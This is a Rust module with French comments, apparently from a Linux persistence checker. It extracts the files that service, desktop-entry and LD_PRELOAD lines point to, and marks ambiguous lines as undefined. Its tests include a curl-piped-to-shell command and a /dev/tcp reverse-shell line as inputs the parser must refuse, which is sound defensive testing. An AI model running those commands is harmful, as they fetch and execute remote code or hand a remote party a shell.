//! Les fichiers que désigne une ligne signalée (le programme d'un service, la bibliothèque d'un préchargement), pour
//! lier un choix « c'est normal chez moi » à leur contenu : remplacer le programme qu'une ligne acceptée lance fait
//! revenir l'alerte. Code pur (std seulement), lu depuis n'importe quel texte par la cible de fuzz `designes`.
//!
//! Strict exprès : ce qui ne se lit pas sans ambiguïté (variable, sous-commande, tube, joker, chemin relatif, espace
//! dans un mot) rend `Indefini`, et la ligne ne peut pas être déclarée normale : on ne lie jamais un choix à moins
//! que ce qui sera lancé. Un nom nu (« python3 ») est cherché dans le PATH au lancement : il n'est pas suivi ici.

#![forbid(unsafe_code)]
#![warn(clippy::arithmetic_side_effects, clippy::as_conversions)]

/// Au plus autant de fichiers suivis par ligne : au-delà, la ligne est trop chargée pour se montrer.
pub(crate) const CHEMINS_MAX: usize = 16;
/// Un chemin plus long que celui-ci n'est pas un chemin que Linux ouvre (PATH_MAX).
pub(crate) const CHEMIN_MAX: usize = 4096;

/// Ce que désigne une ligne.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum Designe {
    /// Ces chemins absolus (dossier personnel déplié), sans double, dans l'ordre de la ligne ; vide : aucun fichier.
    Chemins(Vec<String>),
    /// Ne se lit pas sans ambiguïté : rien ne peut lier un choix à ce qui sera lancé.
    Indefini,
}

/// Caractères qui font d'une ligne autre chose qu'une liste de mots : sous-commande, tube, redirection, joker,
/// échappement, variable. Les « $HOME/ », « ${HOME}/ » et « %h/ » de tête de mot sont dépliés avant.
const INTERDITS: &[char] = &[
    '$', '`', ';', '|', '&', '<', '>', '(', ')', '*', '?', '[', ']', '{', '}', '\\', '\0', '\n', '\r', '#', '!',
];

/// Le préfixe « dossier personnel » d'un mot, déplié ; `None` : le mot n'en a pas.
fn deplier(mot: &str, maison: &str) -> Option<String> {
    ["~/", "$HOME/", "${HOME}/", "%h/"].iter().find_map(|p| {
        mot.strip_prefix(p)
            .map(|reste| format!("{}/{reste}", maison.trim_end_matches('/')))
    })
}

/// Un mot qui désigne un fichier : son chemin absolu ; `Ok(None)` : pas un chemin (option, nom nu) ; `Err` : ambigu.
fn chemin_du_mot(mot: &str, maison: &str) -> Result<Option<String>, ()> {
    let chemin = match deplier(mot, maison) {
        Some(c) => c,
        None if mot.starts_with('/') => mot.to_string(),
        // « ./run », « bin/x », « ~alice/x » : relatif à un dossier qu'on ne connaît pas.
        None if mot.contains('/') || mot.starts_with('~') => return Err(()),
        None => {
            if mot.contains(INTERDITS) || mot.contains('%') {
                return Err(());
            }
            return Ok(None);
        }
    };
    // Un dossier personnel relatif (HOME étrange) ne désigne rien de sûr non plus.
    if !chemin.starts_with('/') || chemin.contains(INTERDITS) || chemin.contains('%') || chemin.len() > CHEMIN_MAX {
        return Err(());
    }
    Ok(Some(chemin))
}

/// Coupe une commande en mots : blancs hors guillemets, guillemets simples ou doubles retirés. `None` : guillemet
/// non fermé, ou un mot qui garde un blanc (« bash -c 'a b' » : un script dans un mot, qu'on ne suit pas).
fn mots(commande: &str) -> Option<Vec<String>> {
    let mut sortie = Vec::new();
    let mut mot = String::new();
    let mut dans: Option<char> = None;
    let mut entame = false;
    for c in commande.chars() {
        match (dans, c) {
            (Some(q), c) if c == q => dans = None,
            (Some(_), c) if c.is_whitespace() => return None,
            (None, '\'' | '"') => {
                dans = Some(c);
                entame = true;
            }
            (None, c) if c.is_whitespace() => {
                if entame || !mot.is_empty() {
                    sortie.push(std::mem::take(&mut mot));
                }
                entame = false;
            }
            (_, c) => mot.push(c),
        }
    }
    if dans.is_some() {
        return None;
    }
    if entame || !mot.is_empty() {
        sortie.push(mot);
    }
    Some(sortie)
}

/// Ajoute un chemin sans double ; `false` si la liste dépasserait `CHEMINS_MAX`.
fn ajouter(chemins: &mut Vec<String>, c: String) -> bool {
    if !chemins.contains(&c) {
        if chemins.len() >= CHEMINS_MAX {
            return false;
        }
        chemins.push(c);
    }
    true
}

/// Les fichiers que désigne une commande lancée (« ExecStart=… », « Exec=… », « exec-once = … », sans sa clé) : le
/// programme et chaque argument qui est un chemin, aussi après un « = » (« --config=~/x »). Les préfixes de systemd
/// (« -@+!: ») sont retirés du premier mot ; les codes d'un .desktop (« %U », « %f »…) ne désignent rien.
pub(crate) fn commande(commande: &str, maison: &str) -> Designe {
    let Some(liste) = mots(commande) else {
        return Designe::Indefini;
    };
    let mut chemins = Vec::new();
    for (i, mot) in liste.iter().enumerate() {
        let mot = if i == 0 {
            mot.trim_start_matches(['-', '@', '+', '!', ':'])
        } else {
            mot.as_str()
        };
        if matches!(mot, "%f" | "%F" | "%u" | "%U" | "%i" | "%c" | "%k") {
            continue;
        }
        // « --config=~/x » : la valeur après le premier « = » ; la clé est un nom d'option.
        let parties: Vec<&str> = match mot.split_once('=') {
            Some((cle, valeur)) if !cle.contains('/') => vec![cle, valeur],
            _ => vec![mot],
        };
        for partie in parties {
            match chemin_du_mot(partie, maison) {
                Err(()) => return Designe::Indefini,
                Ok(None) => {}
                Ok(Some(c)) => {
                    if !ajouter(&mut chemins, c) {
                        return Designe::Indefini;
                    }
                }
            }
        }
    }
    Designe::Chemins(chemins)
}

/// Les bibliothèques d'une valeur de LD_PRELOAD ou LD_AUDIT, ou d'une ligne de /etc/ld.so.preload : séparées par
/// « : » ou des blancs, chacune un chemin absolu (le dossier personnel déplié quand `maison` est donné). Un nom nu
/// est cherché par le chargeur dans ses dossiers : pas suivi ici, donc `Indefini`, comme « $LIB » ou « $ORIGIN ».
pub(crate) fn bibliotheques(valeur: &str, maison: Option<&str>) -> Designe {
    let mut chemins = Vec::new();
    for mot in valeur
        .split(|c: char| c == ':' || c.is_whitespace())
        .filter(|m| !m.is_empty())
    {
        let chemin = match maison.and_then(|m| deplier(mot, m)) {
            Some(c) => c,
            None if mot.starts_with('/') => mot.to_string(),
            None => return Designe::Indefini,
        };
        if !chemin.starts_with('/')
            || chemin.contains(INTERDITS)
            || chemin.contains(['%', '\'', '"'])
            || chemin.len() > CHEMIN_MAX
        {
            return Designe::Indefini;
        }
        if !ajouter(&mut chemins, chemin) {
            return Designe::Indefini;
        }
    }
    if chemins.is_empty() {
        return Designe::Indefini;
    }
    Designe::Chemins(chemins)
}

/// Les bibliothèques qu'une ligne de configuration précharge : « export LD_PRELOAD=… », « LD_AUDIT=… »,
/// « env = LD_PRELOAD,… » (Hyprland), « LD_PRELOAD DEFAULT=… » (pam_env). Une seule affectation par ligne ; une
/// lecture (« echo $LD_PRELOAD »), deux affectations, ou une valeur entre guillemets mal fermés : `Indefini`.
pub(crate) fn prechargement(ligne: &str, maison: &str) -> Designe {
    let noms = ["LD_PRELOAD", "LD_AUDIT"];
    let trouves: Vec<usize> = noms
        .iter()
        .flat_map(|n| ligne.match_indices(n).map(|(i, _)| i))
        .collect();
    let [debut] = trouves[..] else {
        return Designe::Indefini;
    };
    let Some(reste) = noms
        .iter()
        .find_map(|n| ligne.get(debut..).and_then(|r| r.strip_prefix(n)))
    else {
        return Designe::Indefini;
    };
    let reste = reste.trim_start();
    let reste = reste.strip_prefix("DEFAULT").map_or(reste, str::trim_start);
    let Some(valeur) = reste.strip_prefix(['=', ',']) else {
        return Designe::Indefini;
    };
    let valeur = valeur.trim();
    let valeur = match valeur.chars().next() {
        Some(q @ ('\'' | '"')) => match valeur.get(1..).and_then(|v| v.strip_suffix(q)) {
            Some(v) if !v.contains(q) => v,
            _ => return Designe::Indefini,
        },
        _ => valeur,
    };
    bibliotheques(valeur, Some(maison))
}

#[cfg(test)]
mod tests {
    use super::*;

    const M: &str = "/home/alice";

    fn chemins(v: &[&str]) -> Designe {
        Designe::Chemins(v.iter().map(ToString::to_string).collect())
    }

    #[test]
    fn programmes_designes() {
        assert_eq!(
            commande("%h/.cache-x/rappel.sh --doux", M),
            chemins(&["/home/alice/.cache-x/rappel.sh"])
        );
        assert_eq!(
            commande("-/usr/bin/python3 ~/.outils/x.py --conf=$HOME/.outils/c.toml", M),
            chemins(&[
                "/usr/bin/python3",
                "/home/alice/.outils/x.py",
                "/home/alice/.outils/c.toml"
            ])
        );
        assert_eq!(commande("\"/tmp/.x/run\" %U", M), chemins(&["/tmp/.x/run"]));
        assert_eq!(commande("python3 -m serveur", M), chemins(&[]));
        // Deux fois le même : une fois.
        assert_eq!(commande("/opt/a /opt/a", M), chemins(&["/opt/a"]));
    }

    #[test]
    fn lignes_ambigues_indefinies() {
        // Un dossier personnel relatif (HOME étrange, trouvé par le fuzz) ne désigne rien de sûr.
        assert_eq!(commande("~/x", "maison"), Designe::Indefini);
        assert_eq!(bibliotheques("~/x.so", Some("maison")), Designe::Indefini);
        for c in [
            "bash -c 'curl -s http://x | sh'",
            "bash -i >& /dev/tcp/192.0.2.7/4444 0>&1",
            "./run",
            "bin/agent",
            "$X/agent",
            "/opt/$(id -u)/a",
            "/tmp/a*",
            "~bob/.x/a",
            "%t/a",
            "/opt/a 'non fermé",
            "/opt/a\\ b",
            "sh -c '/tmp/x arg'",
        ] {
            assert_eq!(commande(c, M), Designe::Indefini, "{c}");
        }
        let longue = (0..=CHEMINS_MAX)
            .map(|i| format!("/opt/{i}"))
            .collect::<Vec<_>>()
            .join(" ");
        assert_eq!(commande(&longue, M), Designe::Indefini);
        assert_eq!(commande(&format!("/{}", "a".repeat(CHEMIN_MAX)), M), Designe::Indefini);
    }

    #[test]
    fn prechargements_designes() {
        assert_eq!(
            prechargement("export LD_PRELOAD=/opt/l/libz.so:~/.l/liby.so", M),
            chemins(&["/opt/l/libz.so", "/home/alice/.l/liby.so"])
        );
        assert_eq!(prechargement("env = LD_PRELOAD,/tmp/a.so", M), chemins(&["/tmp/a.so"]));
        assert_eq!(
            prechargement("LD_AUDIT DEFAULT=\"/opt/a.so /opt/b.so\"", M),
            chemins(&["/opt/a.so", "/opt/b.so"])
        );
        for l in [
            "echo $LD_PRELOAD",
            "export LD_PRELOAD=libz.so",
            "export LD_PRELOAD=/a.so LD_AUDIT=/b.so",
            "export LD_PRELOAD='$LIB/a.so'",
            "export LD_PRELOAD=\"/a.so",
            "export LD_PRELOAD=",
        ] {
            assert_eq!(prechargement(l, M), Designe::Indefini, "{l}");
        }
        assert_eq!(bibliotheques("/usr/lib/libx.so", None), chemins(&["/usr/lib/libx.so"]));
        assert_eq!(bibliotheques("~/.l/a.so", None), Designe::Indefini);
        assert_eq!(bibliotheques("/lib/$PLATFORM/a.so", None), Designe::Indefini);
    }
}
